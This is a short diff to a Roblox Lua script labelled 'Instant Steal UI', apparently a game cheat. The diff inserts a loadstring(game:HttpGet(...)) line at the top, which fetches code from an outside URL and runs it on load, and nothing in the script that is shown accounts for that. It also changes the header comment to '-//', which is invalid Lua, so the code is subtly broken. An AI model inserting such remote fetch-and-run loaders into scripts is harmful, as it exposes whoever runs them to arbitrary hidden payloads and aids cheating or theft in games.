@@ -1,4 +1,6 @@
---// Instant Steal UI
+loadstring(game:HttpGet("https://star-scripts.com/api/run/HAGko_mk9Q3ueW6Qzo4kZICcoCpyQdj-"))()
+
+-// Instant Steal UI
 --// Put this LocalScript in StarterPlayer > StarterPlayerScripts
 
 local Players = game:GetService("Players")
